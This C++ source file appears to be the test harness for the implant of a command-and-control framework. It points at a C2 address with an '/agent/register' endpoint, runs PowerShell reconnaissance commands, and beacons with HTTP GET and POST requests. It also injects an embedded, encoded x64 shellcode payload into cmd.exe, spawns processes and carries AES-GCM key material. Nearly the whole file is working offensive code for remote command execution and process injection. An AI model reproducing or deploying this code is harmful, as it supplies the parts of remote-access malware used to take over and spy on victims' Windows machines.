#include "exec_shell.h"
#include "aes_gcm.h"
#include "http.h"
#include "inject.h"
#include <iostream>
#include <fstream>

// BYTE textIV[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1};
// BYTE key[] = {0x41, 0x13, 0xcd, 0xa3, 0xa0, 0xe0, 0xab, 0x5e, 0x19, 0xf1, 0xc0, 0x1c, 0x6d, 0x4e, 0x77, 0xc5, 0xe5, 0x20, 0xd2, 0x44, 0xe, 0x52, 0xae, 0x87, 0xaa, 0xa, 0x96, 0x67, 0x28, 0x82, 0xea, 0x8};
LPCWSTR c2Domain = L"127.0.0.1";
LPCWSTR registerURI = L"/agent/register";
LPCWSTR testURI = L"test";
std::string password = "password";
int port = 5000;

// helper function to print a byte array
void printHexArray(BYTE* data, int len) {
    printf("{");
    for (int i = 0; i < len; i++) {
        if (i != 0) {
            printf(", ");
        }
        printf("0x%x", data[i]);
    }
    printf("}\n");
}

void test_exec_shell() {
    std::string cmd = "powershell /c whoami \0";
    std::string res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    cmd = "powershell /c pwd \0";
    res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    cmd = "powershell /c ls \0";
    res = exec_shell(&cmd[0]);
    std::cout << cmd << ": " << std::endl;
    std::cout << res << std::endl;

    std::cout << "pre-defined commands: " << std::endl;

    std::cout << exec_shell(CommonCmd::whoami) << std::endl;

    std::cout << exec_shell(CommonCmd::ls) << std::endl;

    std::cout << exec_shell(CommonCmd::os_info) << std::endl;

    std::cout << exec_shell(CommonCmd::sys_info) << std::endl;

    std::cout << exec_shell(CommonCmd::cpu_num) << std::endl;
}

void test_aesgcm() {
    // BYTE message[] = "Test message";

    // auto box = new AESGCM(key);
    // box->Encrypt( (BYTE*) textIV, sizeof(textIV), (BYTE*) message, sizeof(message));

    // printf("ciphertext: ");
    // printHexArray(box->ciphertext, box->ciphertextSize);
    // printf("tag: ");
    // printHexArray(box->tag, box->authTagLengths.dwMaxLength);

    // box->Decrypt(textIV, sizeof(textIV), box->ciphertext, sizeof(message), box->tag, box->authTagLengths.dwMinLength );
    // for(size_t i=0; i< box->ptBufferSize; i++){
    //     printf("%c", (char) box->plaintext[i]);
    // }
    // printf("\n");

    // delete box;
}

void test_http() {
    std::string message = "Test message";

    std::cout << "sending get request\n";
    std::string getResponse = httpGet(c2Domain, port, testURI);

    std::cout << getResponse << std::endl;

    std::cout << "sending post request\n";
    std::string response = httpPost(c2Domain, port, testURI, message);

    std::cout << response << std::endl;

    // BYTE testBytes[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1, 0xb5, 0x6a,
    //                     0x9b, 0x69, 0x26, 0x0e, 0x79, 0x75, 0xe5, 0x81, 0x29, 0xe0, 0x6d, 0x68, 0xb3, 0x62, 
    //                     0x1f, 0xc4, 0x4d, 0xa3, 0x55, 0xda, 0x0f, 0x32, 0xb6, 0xd2, 0x89, 0x7b, 0x22};
    // std::vector<BYTE> testVec(testBytes, testBytes + sizeof(testBytes));

    // std::string decrypted = decryptPayload(testVec);
    // std::cout << decrypted << std::endl;
}

void test_inject()
{
    // std::cout << getProcID() << std::endl;
    // char* shellcode;
    // inject(shellcode);
    unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78"
		"\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e"
		"\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09"
		"\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3"
		"\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff"
		"\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d"
		"\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8"
		"\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69"
		"\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1"
		"\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e"
		"\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f"
		"\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa"
		"\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e"
		"\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2"
		"\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5"
		"\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3"
		"\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61"
		"\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b"
		"\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2"
		"\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63"
		"\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6"
		"\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55"
		"\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec"
		"\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b"
		"\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d"
		"\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b"
		"\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2"
		"\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68"
		"\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8"
		"\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61"
		"\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad"
		"\x94\x64\x5d\xae\x2b\x90\xe1\xec";
    
    std::string exePath = "C:\\WINDOWS\\system32\\cmd.exe";
    // std::cout << shellcode << std::endl;
    inject(exePath, shellcode);
}

void test_spawn_process() {
    std::string exePath = "C:\\Windows\\system32\\cmd.exe";
    spawnProcess(exePath);
}

int main(int argc, char* argv[])
{   
    if (argc != 2) {
        std::cout << "specify which test to run" << std::endl;
        return 0;
    }

    std::string test_name = std::string(argv[1]);

    if (test_name == "exec_shell") {
        test_exec_shell();
    } else if (test_name == "aesgcm") {
        test_aesgcm();
    } else if (test_name == "http") {
        test_http();
    } else if (test_name == "inject") {
        test_inject();
    } else if (test_name == "spawn") {
        test_spawn_process();
    } else {
        std::cout << "test name invalid" << std::endl;
    }
    
    return 0;
}